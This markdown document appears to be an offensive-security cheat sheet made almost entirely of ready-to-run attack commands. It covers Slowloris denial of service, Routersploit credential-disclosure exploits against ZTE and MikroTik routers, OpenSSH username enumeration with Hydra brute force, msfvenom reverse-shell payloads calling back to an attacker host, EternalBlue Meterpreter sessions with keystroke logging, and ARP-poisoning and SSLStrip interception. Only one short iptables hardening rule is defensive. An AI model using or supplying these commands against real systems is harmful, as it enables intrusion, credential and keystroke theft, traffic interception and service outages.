
## OSI Layer

| No | Layer | Example |
| --- | --- | --- |
| 7 | Application | SMTP |
| 6 | Presentation | HTTPS, SSL, TLS |
| 5 | Session | NetBIOS, PPTP |
| 4 | Transport | TCP, UDP |
| 3 | Network | Router, IP, ICMP |
| 2 | Data Link | Switch |
| 1 | Physical | Hub, NIC, Cable |

## Denial Of Service
Slowloris (GET Exploit)
-----
Perl Example
```
perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
``` 
Slowloris Python (GET Exploit)
Source : https://github.com/gkbrk/slowloris
-----
Install
```
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```
Running
```
python3 slowloris.py [IP_TARGET] --port 80 --sleeptime 1000
```
## Anonymousdoser (POST Exploit)
Source : 
```
Website [URL/IP] : [IP_TARGET]
Time [Seconds] : 9999
```
## Harderning
IP Tables
```
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
```
Log Apache & Nginx
```
/var/log/apache2/access.log
/var/log/nginx/access.log
```
Live Running Log
```
tail -f ./access.log
```

## Routersploit
Exploit For Router HGU, Mikrotik, IPCAM, etc.
Source : https://github.com/threat9/routersploit
---
Case Router ZTE_F609 and ZTE_F660
```
show exploits
search zte
use exploits/routers/zte/f609_config_disclosure
use exploits/routers/zte/f660_config_disclosure
show options
set target [IP_TARGET]
exploit
```
Case Router MikroTik 6.29-6.42 (Port 8291)
```
search mikrotik 6.29 - 6.42	=> 8291
use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
show options
set target [IP_TARGET]
exploit
```

## Scanning Port and Service
NMAP
```
nmap -sn [RANGE_IP]
nmap -A [IP_TARGET]
```
Netdiscovery
```
netdiscovery
```
Nbtscan
```
nbtscan [NETWORK_IP]
```

## Brute Force CVE-2018-15473 (OpenSSH 2.3 < 7.7)
Source : https://www.exploit-db.com/exploits/45233
Running Exploit 
```
python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
hydra -L user.txt -P pass.txt [IP_TARGET] ssh
```

## Payload Msvenom
Payload Reverse Shell
| Target | Example |
| --- | --- |
| Android | msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=4444 R > payload.apk |
| Windows Staged | msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe |
| Windows Stageless | msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe |
| Linux | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf >reverse.elf |
| OSX | msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho |
| Python | msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py |
| PHP | msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4444 -f raw > shell.php; cat shell.php \| pbcopy && echo '<?php ' \| tr -d '\n' > shell.php && pbpaste >> shell.php |
| Bash | msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh |

## Meterpreter
Windows 10 64bit
```
msfconsole -q
search ms17_010_ethernalblue
use exploit [ms17_010_ethernalblue]
set payload windows/x64/meterpreter/reverse_tcp
set rhost [ip target]
exploit
```
Windows 10 SMB Exploit
```
msfconsole -q
use exploit windows/smb/eternalblue_doublepulsar
set payload windows/meterpreter/reverse_tcp
set rhost [ip target]
exploit
```
Windows Access From Attacker
```
shell => Access CMD Windows
run vnc
migrate exploler.exe
keyscan_start
keyscan_dump
```

## MITM Ethercap

```
Ettercap -G

options
enable promisc mode => ethernet mode
disable promisc mode => wireless mode

sniff
unified sniffing
network interface => eth0

host
hostlist
add target 1 => router
add target 2 => pc

target
enable current target

plugins
manage the plugins
remote_browser

mitm
arp poisoning
enable sniff remote connection
```

## MITM SSLStrip
Forwarding Port
```
echo 1> /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to- port 10000
```
ARP Spoofing
```
arpspoof -i eth0 -t [IP_TARGET] -r [IP_ROUTER]
sslstrip -l 10000
```
Log SSL Strip
```
sslstrip.log
```


